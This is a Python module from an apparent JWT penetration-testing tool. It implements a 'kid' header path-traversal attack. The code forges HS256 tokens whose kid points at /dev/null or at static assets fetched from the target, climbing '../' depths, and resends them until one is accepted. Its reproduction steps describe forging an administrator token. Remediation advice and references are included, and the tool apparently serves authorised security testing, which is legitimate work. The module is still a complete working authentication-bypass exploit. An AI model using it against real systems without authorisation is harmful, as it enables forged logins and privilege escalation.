"""Attack 6: kid path traversal, abuse the "kid" header as a file path.

A JWT header's "kid" (key id) tells the server which key to verify with. Some servers treat it
as a FILE PATH and load the key from that file. If an attacker controls "kid", they can point it
at a file whose contents they know, sign an HS256 token with those contents as the HMAC secret,
and the server will "verify" it successfully, because it is using an attacker-known key.

Two variants, both signed as HS256 so the loaded file bytes are used as a symmetric secret:

  * Empty file: point "kid" at an empty/predictable file such as /dev/null, so the key is empty.
    Servers load that empty key differently, so we try a few spellings of "nothing" (an empty
    string, a single null byte, and the literal "AA==" that key editors produce for a null byte).
  * Known file: point "kid" at a file whose exact bytes we know, and sign with those bytes. The
    tester may supply the server-side file path (and, optionally, its contents); if the contents
    are not given we fetch that path from the target, and if no path is given at all we discover a
    static asset the app serves and use its bytes.

Because "kid" is a filesystem path on the server, not a URL path, we try the target path from a
range of directory depths (climbing with "../") as well as as an absolute path.
"""

import re

import requests

from jwtpen.core.jwt_utils import decode, encode, construct_jwt, sign_hmac
from jwtpen.core.raw_request import parse_request, swap_token
from jwtpen.core.checker import send, classify, resembles, ACCEPTED
from jwtpen.attacks.base import Finding, VULNERABLE, NOT_VULNERABLE, INCONCLUSIVE, HIGH


# How many "../" levels to prepend when guessing how deep the server's working directory sits.
# We don't know the base directory, so we try every depth from 0 up to this, plus the absolute
# path, and let the server resolve whichever one reaches the file.
_MAX_DEPTH = 10

# The HMAC keys to try when "kid" points at an empty/null file. A server may load that file's
# (empty) contents as the key in any of these forms, so we cover all three:
#   - an empty byte string (the file is genuinely empty)
#   - a single null byte (what key editors produce from the common base64 value "AA==")
#   - the literal text "AA==" (a server that uses the unparsed value as the key)
_EMPTY_FILE_KEYS = [
    ("empty string", b""),
    ("single null byte", b"\x00"),
    ('literal "AA=="', b"AA=="),
]

# Static assets we can read over HTTP to learn their bytes, used when auto-discovering a
# known-contents file. First match in the app's home page is used.
_ASSET_PATTERN = re.compile(
    r"""(?:href|src)\s*=\s*["']?(/[^"'>\s]+\.(?:css|js|png|ico|svg|woff2?|jpg|jpeg|gif))""",
    re.IGNORECASE,
)


def _traversal_variants(target_path):
    """Return "kid" values that try to reach `target_path` from different directory depths.

    Includes the absolute path, and the relative path climbed from 0 up to _MAX_DEPTH levels
    with "../", because the server's base directory depth is unknown.
    """
    relative = target_path.lstrip("/")
    variants = ["/" + relative]  # absolute path, e.g. "/dev/null"
    for depth in range(_MAX_DEPTH + 1):
        variants.append("../" * depth + relative)
    return variants


def forge(token, kid_value, key):
    """Rebuild `token` as an HS256 token whose "kid" is `kid_value`, signed with `key`.

    The payload is left unchanged; only the header's "kid" and "alg" are set and the token is
    re-signed, so the server loads `key` from the "kid" path and verifies against it. `key` may
    be str or bytes (sign_hmac accepts either).
    """
    header, payload, _ = decode(token)
    header["kid"] = kid_value
    header["alg"] = "HS256"
    signing_input = encode(header, payload)
    signature = sign_hmac(signing_input, key, "HS256")
    return construct_jwt(signing_input, signature)


def _fetch(parsed, scheme, url_path):
    """GET `url_path` from the target host and return the response, or None if it fails.

    Reuses the pasted request's headers (cookies and all) but as a plain GET with no body, so a
    static file loads the same way a browser would. Any network error returns None rather than
    aborting the whole check.
    """
    probe = {
        "method": "GET",
        "path": url_path,
        "headers": parsed["headers"],
        "body": "",
    }
    try:
        return send(probe, scheme)
    except requests.RequestException:
        return None


def _discover_static_asset(parsed, scheme):
    """Return (url_path, key_bytes) for a static asset the app serves, or None if none found.

    We read the app's home page, take the first referenced static file (css/js/image/font), and
    fetch its bytes. Those bytes become the candidate HMAC key; the url path is our best guess at
    the file's location to put in "kid".
    """
    home = _fetch(parsed, scheme, "/")
    if home is None or home.status_code != 200:
        return None
    match = _ASSET_PATTERN.search(home.text)
    if not match:
        return None
    url_path = match.group(1)
    asset = _fetch(parsed, scheme, url_path)
    if asset is None or asset.status_code != 200:
        return None
    return url_path, asset.content


def _build_candidates(parsed, scheme, options):
    """Build the ordered list of (variant, kid_value, key, key_label) tuples to try.

    Empty-file candidates always run. Known-file candidates are added when the tester supplies a
    file path (with contents, or fetched from the target) or when auto-discovery finds an asset.
    """
    options = options or {}
    candidates = []

    # --- Empty-file variant: /dev/null across depths, each empty-key spelling. ---
    for kid_value in _traversal_variants("dev/null"):
        for key_label, key in _EMPTY_FILE_KEYS:
            candidates.append(("empty file", kid_value, key, key_label))

    # --- Known-file variant: user-supplied path/contents, else auto-discovered asset. ---
    user_path = options.get("kid_file_path")
    user_key = options.get("kid_file_key")
    if user_path:
        if user_key is not None:
            key = user_key.encode() if isinstance(user_key, str) else user_key
        else:
            # No contents given: read the file from the target over HTTP to learn its bytes.
            response = _fetch(parsed, scheme, "/" + user_path.lstrip("/"))
            key = response.content if response is not None and response.status_code == 200 else None
        if key is not None:
            for kid_value in _traversal_variants(user_path):
                candidates.append(("known file", kid_value, key, "supplied file contents"))
    elif options.get("kid_auto_fetch", True):
        discovered = _discover_static_asset(parsed, scheme)
        if discovered is not None:
            url_path, key = discovered
            for kid_value in _traversal_variants(url_path):
                candidates.append(("known file (auto)", kid_value, key, f"bytes of {url_path}"))

    return candidates


# --- Static content for this attack's report section ---
NAME = "Key ID (kid) Path Traversal"
DESCRIPTION = "Checks whether the kid header can be pointed at a file whose contents the attacker knows, so a self-signed token verifies."

# This check can run with no input (the empty-file variant and auto-discovery always run), but a
# tester who knows a readable server-side file can drive the known-file variant directly. The
# registry exposes this flag so the UI attaches an OPTIONAL file-path control; unlike the wordlist
# and hosting controls, leaving it blank never blocks the run.
KID_FILE_OPTION = True
KID_FILE_HINT = ("Optional: name a file the server can read whose contents you know, to point the "
                 "kid at it. Leave the contents blank to have the tool fetch that path from the "
                 "target. Leave both blank to test an empty file (/dev/null) and an auto-discovered "
                 "static asset.")

_SUMMARY = {
    VULNERABLE: ("The server loaded its verification key from the file named in the token's "
                 '"kid" header. By pointing "kid" at a file whose contents are known and signing '
                 "the token with those contents, an attacker can forge any token and bypass "
                 "authentication entirely."),
    NOT_VULNERABLE: ('The server did not accept any token whose "kid" header pointed at an '
                     "attacker-known file, which indicates the key id is not used as a file path."),
    INCONCLUSIVE: ("The result could not be judged automatically: the endpoint responded the "
                   "same way with and without a valid token, so accepted and rejected tokens "
                   "could not be told apart."),
}

_REPRODUCTION = [
    "Log in and capture your session JWT from the request.",
    'Decode it and change the header\'s "alg" to "HS256" and its "kid" to a path you control the '
    "contents of. The simplest is an empty file such as /dev/null (try it both as an absolute "
    'path and climbed with "../" prefixes, since the server\'s base directory is unknown).',
    "Sign the token with HS256 using the key that file yields. For /dev/null that key is empty, "
    'so try an empty secret, a single null byte, and the literal "AA==" that key editors produce '
    "for a null byte.",
    "Resend the request with this forged token. If you remain logged in, the server loaded its "
    "key from your file path. That is the vulnerability.",
    'To demonstrate impact, edit a claim in the payload (for example change "sub" to an '
    "administrator), re-sign with the same key, and resend. If the server grants that account's "
    "access, you have forged a privileged token. Where you know the exact bytes of another file "
    'the server can read (a static asset, for instance), you can repeat this with that file as '
    "the key instead.",
]

_REMEDIATION = (
    'Do not use the "kid" header as a file path. Resolve it only against a fixed allow-list or '
    "key store keyed by exact id, never by reading a path from the token, and reject any kid that "
    "is unknown or contains path separators or traversal sequences. Verify every token against an "
    "explicit allow-list of strong algorithms and never let the token choose its own verification "
    "key or algorithm."
)

_REFERENCES = [
    {"label": "OWASP JSON Web Token for Java Cheat Sheet",
     "url": "https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html"},
    {"label": "OWASP Top 10: Identification and Authentication Failures",
     "url": "https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"},
    {"label": "RFC 7515: JSON Web Signature (JWS), the kid header parameter",
     "url": "https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.4"},
]


def run(raw_request, token, scheme, options=None):
    """Run the kid path-traversal check end to end and return a Finding.

    Baselines are sent once (good = original token, bad = unparseable token). Then each forged
    candidate (empty-file spellings, then any known-file candidates) is sent in turn; the FIRST
    one the server accepts proves the vulnerability and records which file path and key worked.
    """
    parsed = parse_request(raw_request)
    good = send(parsed, scheme)
    bad = send(parse_request(swap_token(raw_request, token, "INVALID")), scheme)
    url = scheme + "://" + parsed["headers"]["Host"] + parsed["path"]

    accepted = None  # (variant, kid_value, key_label, forged_token, response) once one is accepted

    if resembles(good, bad):
        # The app answers the same whether or not you're authenticated: no verdict is trustworthy.
        status = INCONCLUSIVE
    else:
        candidates = _build_candidates(parsed, scheme, options)
        for variant, kid_value, key, key_label in candidates:
            forged_token = forge(token, kid_value, key)
            response = send(parse_request(swap_token(raw_request, token, forged_token)), scheme)
            if classify(good, bad, response) == ACCEPTED:
                accepted = (variant, kid_value, key_label, forged_token, response)
                break
        status = VULNERABLE if accepted is not None else NOT_VULNERABLE

    methodology = [
        'Set the token\'s algorithm to "HS256" and its "kid" header to a file path whose contents '
        "the tool knows, then signed the token with those contents as the HMAC key.",
        "Tried an empty/null file (/dev/null) across a range of directory depths, and any "
        "known-contents file supplied or discovered, resending the original request with each.",
    ]
    if accepted is not None:
        variant, kid_value, key_label, _, response = accepted
        methodology.append(
            f'The server accepted the token (variant: {variant}; kid = "{kid_value}"; '
            f"key = {key_label}), so it loads its verification key from the kid path."
        )
    elif status == NOT_VULNERABLE:
        methodology.append("The server rejected every candidate, so the kid header is not used as a file path.")
    else:
        methodology.append("The endpoint responded the same way with and without a valid token, so the result could not be judged automatically.")

    evidence = {
        "Target URL": url,
        "Expected Response (Valid Token)": f"HTTP {good.status_code}",
    }
    if accepted is not None:
        variant, kid_value, key_label, forged_token, response = accepted
        evidence["Received Response (Forged Token)"] = f"HTTP {response.status_code}"
        evidence["Variant"] = variant
        evidence["Accepted kid"] = kid_value
        evidence["Signing Key"] = key_label
        evidence["Forged Token"] = forged_token

    return Finding(
        attack=NAME,
        status=status,
        severity=HIGH,
        summary=_SUMMARY[status],
        methodology=methodology,
        reproduction=_REPRODUCTION,
        evidence=evidence,
        remediation=_REMEDIATION,
        references=_REFERENCES,
    )
